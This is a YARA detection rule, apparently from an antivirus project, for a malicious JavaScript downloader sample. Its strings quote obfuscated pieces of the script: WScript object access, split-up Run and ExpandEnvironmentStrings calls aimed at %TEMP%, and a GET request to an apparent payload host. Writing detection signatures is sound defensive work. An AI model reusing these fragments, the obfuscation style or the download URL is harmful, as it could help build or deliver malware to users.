rule sig_20160428_31e69507a0ae3612f29d85a8d462f356 {
  meta:
    description = "datamaliciousorder - file 20160428_31e69507a0ae3612f29d85a8d462f356.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "95307c6c37613e7c81276539d7f681b97d9775eba0bb8e6da0fe07442ef67361"

  strings:
    $s1  = "function PfiIoaVnxCktWloAywSzf() {return GwaSovOxxLkyAynOvzDyp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function FgpWfoHfoEyiLmoKldIub(BnmAafWrcEdfBypDshNyk){GwaSovOxxLkyAynOvzDyp[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function FgpWfoHfoEyiLmoKldIub(BnmAafWrcEdfBypDshNyk){GwaSovOxxLkyAynOvzDyp[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return QzaStjQmxEeyWipAbqNav - QcjIwjRkfPseAaxIsyTjf;};" fullword ascii
    $s5  = "var GwaSovOxxLkyAynOvzDyp = function XwsAasCbwPepOivIxjPfs() {return LhlPgmBkqQdaCjnXvfFxx[FidRweBdgAjtEdkPkqJys](\"WScript\"+\"" ascii
    $s6  = "function NrrHviKvlUtjUedFhdReo() {return ((CueUpsIptNksPybDegHyx == true) && (CueUpsIptNksPybDegHyx == XiaAdaWjbCnhDiuTkvDfe)) ?" ascii
    $s7  = "function WxyVpxLfgYdcCyjPhiZxf(QzaStjQmxEeyWipAbqNav, QcjIwjRkfPseAaxIsyTjf){UxuWekDpeHpnMxgNydLou = UxuWekDpeHpnMxgNydLou * 1; " ascii
    $s8  = "function NrrHviKvlUtjUedFhdReo() {return ((CueUpsIptNksPybDegHyx == true) && (CueUpsIptNksPybDegHyx == XiaAdaWjbCnhDiuTkvDfe)) ?" ascii
    $s9  = "var GwaSovOxxLkyAynOvzDyp = function XwsAasCbwPepOivIxjPfs() {return LhlPgmBkqQdaCjnXvfFxx[FidRweBdgAjtEdkPkqJys](\"WScript\"+\"" ascii
    $s10 = "var LhlPgmBkqQdaCjnXvfFxx = this[\"WScript\"];" fullword ascii
    $s11 = "var CueUpsIptNksPybDegHyx = false;" fullword ascii
    $s12 = "function PfiIoaVnxCktWloAywSzf() {return GwaSovOxxLkyAynOvzDyp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s13 = "CueUpsIptNksPybDegHyx = true; " fullword ascii
    $s14 = "function JgqKpzXjsHvgGayTsoMrw(){return YowWweNnlLidBngLtcBik + \"\";};" fullword ascii
    $s15 = "function WxyVpxLfgYdcCyjPhiZxf(QzaStjQmxEeyWipAbqNav, QcjIwjRkfPseAaxIsyTjf){UxuWekDpeHpnMxgNydLou = UxuWekDpeHpnMxgNydLou * 1; " ascii
    $s16 = "if (TjeMhoRbtAdiJqrPviWdq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s17 = "TjeMhoRbtAdiJqrPviWdq[TcnHhvBjqYnpNcaByxYlh](\"G\" + \"ET\", \"http://3dphoto-rotate.ru/h4ydjs\", false);" fullword ascii
    $s18 = "var QdlDyiWvpBciMunJhbOhd = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "var NmvIdeTbtGiqLzuTykPxm = false;" fullword ascii
    $s20 = "function TbxOknDiaSfcMhoItfEhh()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}